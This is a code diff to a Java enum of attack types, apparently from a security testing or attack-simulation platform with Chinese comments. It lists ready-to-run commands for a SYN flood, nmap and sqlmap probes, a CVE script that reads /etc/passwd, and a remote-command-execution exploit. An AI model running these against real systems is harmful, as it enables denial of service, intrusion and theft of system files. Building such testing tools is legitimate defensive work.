@@ -14,8 +14,12 @@ public enum AttackType {
     // 降效
     JIANGXIAO(2, "17517000425962","降效", "", "hping3 -q -n --rand-source -S -p 80 --flood ${ip}", "Hping3 SYN flood", "发大量半连接请求造成 TCP backlog 饱和最总导致CPU使用率飙升", false, ""),
 
-    // 嗅探
-    XIUTAN(3, "17517000425963","嗅探","sniffing", "nmap ${ip}", "目标系统嗅探", "探查目标服务器开放服务端口", false, "Nmap done:"),
+    // 嗅探， 端口服务扫描
+    XIUTAN(3, "17517000425963","嗅探","sniffing", "nmap ${ip}", "nmap目标系统嗅探", "探查目标服务器开放服务端口", false, "Nmap done:"),
+    // 嗅探，操作系统版本/数据库版本
+    XIUTAN_SQLMAP(3, "17517000425931","嗅探","sniffing", "sqlmap -u http://${ip}:80/animal-detail.php?anid=1 --batch", "sqlmap目标数据库嗅探", "嗅探目标服务系统版本信息安装数据库服务信息", false, "back-end DBMS"),
+    // 嗅探，获取/etc目录下的文件内容
+    XIUTAN_FILE(3, "17517000425932","嗅探","sniffing", "python cve-2020-6142.py http://${ip}/ admin test0@123456 /etc/passwd", "目标文件嗅探", "嗅探目标系统下/etc目录的文件信息", false, "root:"),
 
     //操控
     CAOKONG(4, "17517000425964","操控","", "python3 CVE-2017-16720.py ${ip}", "Advantech WebAccess 远程命令执行漏洞", "远程控制目标主机打开计算器calc.exe。", false, "Did it work?"),
@@ -45,6 +49,9 @@ public enum AttackType {
 
     private Boolean needManualCheckAttackEffect;
 
+    /**
+     * 成功命令返回值包含的关键字符串
+     */
     private String successContent;
 
     AttackType(int type, String toolId, String category, String flowType,String cmd, String attackDesc,
